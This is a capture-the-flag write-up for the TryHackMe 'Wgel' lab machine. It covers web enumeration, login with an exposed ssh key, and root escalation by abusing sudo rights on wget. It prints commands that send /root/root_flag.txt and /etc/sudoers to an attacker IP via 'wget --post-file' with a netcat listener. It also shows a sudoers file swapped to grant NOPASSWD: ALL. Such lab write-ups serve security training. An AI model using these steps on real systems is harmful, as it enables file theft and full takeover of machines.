# Wgel \(L\)

_TryHackMe_ – [**WgelCTF**](https://tryhackme.com/room/wgelctf) Write-Up

_topics_: web application security, Linux Privilege Escalation

1. **Plan**
2. **Enumeration**
3. **Local Privilege Escalation \(Exploitation\)**
4. **Root Privilege Escalation**

new tools: 

tools: nmapAutomator, dirsearch, ssh, python, sudo, wget

## 1\) Plan

We are provided a hint that wget will be necessary in escalating our privileges.

## 2\) Enumeration

following `./nmapAutomator.sh <ip> Basic`

![](.gitbook/assets/image%20%289%29.png)

And following `python3 dirsearch.py -u http://10.10.233.72/ -e php`

![](.gitbook/assets/image%20%2821%29.png)

So port 22 **\(ssh version 7.2p2**\) and port 80 \(**http** **Apache httpd 2.4.18**\) are open on the Ubuntu machine. We also have access to _/index.html,_ and ****_**/sitemap**_. There doesn't seem to be anything interesting on the default page. Lets enumerate the _**/sitemap**_ subdirectory more to check for potential attack vectors.

`python3 dirsearch.py -u http://10.10.233.72/sitemap -e php,html,txt`

![](.gitbook/assets/image%20%2834%29.png)

This additional enumeration of _**/sitemap**_ proves to be worth it, as numerous subdirectories are revealed including _**/.ssh**_ and _**/.ssh/id\_rsa**_ which is more than likely our way into the machine because we know that port 22 \(ssh\) is open. Lets inspect the contents to see 

![](.gitbook/assets/image%20%2845%29.png)

## 3\) Local Privilege Escalation

There is an **ssh id\_rsa key** in plaintext for us to login to the system. We simply need a username to ssh into. Lets recheck the source code of the website as well as _**/sitemap**_ to search for a potential username. 

![](.gitbook/assets/image%20%2840%29.png)

Seems like the admin made a crucial mistake in naming an employee, we can more than likely bet that jessie is the applicable username. Lets attempt to ssh into the machine:

`ssh -i id_rsa jessie@10.10.233.72`

![And we have local privilege escalation.](.gitbook/assets/image%20%2843%29.png)

## 4\) Root Privilege Escalation

First things first. Lets list the OS information and sudo privileges

`cat /etc/lsb-release`

`uname -a`

`sudo -l`

![](.gitbook/assets/image%20%2816%29.png)

We have an Ubuntu 16.04 system with **kernel 4.15.0** and _**/usr/bin/wget**_ has sudo privileges.

We could simply listen with `nc -nlvp 4445` and catch the root flag by running `sudo wget --post-file=/root/root_flag.txt 10.10.140.60:4445` on the victim. This would print the root flag but we want a reverse shell to be able to run whatever command we need.

In order to accomplish this, we must use the sudo privilege on wget in the most efficient way possible. Because we would be able to transfer any file to the attacker and send back with wget, why not simply send the sudoers file, edit it to include all users and send it back to the victim.

On attacking machine listen with netcat

`nc -nlvp 4445`

On victim machine send the sudoers file

`sudo wget --post-file=/etc/sudoers 10.10.140.60:4445`

Netcat will catch and print the file. Copy the contents, make a working directory and create a new file named sudoers, replacing`NOPASSWD: /usr/bin/wget` with `NOPASSWD: ALL`

On victim, `cd /etc` and download the new sudoers file

`sudo wget 10.10.140.60/files/sudoers --output-document=sudoers`

![pwned](.gitbook/assets/image%20%2836%29.png)

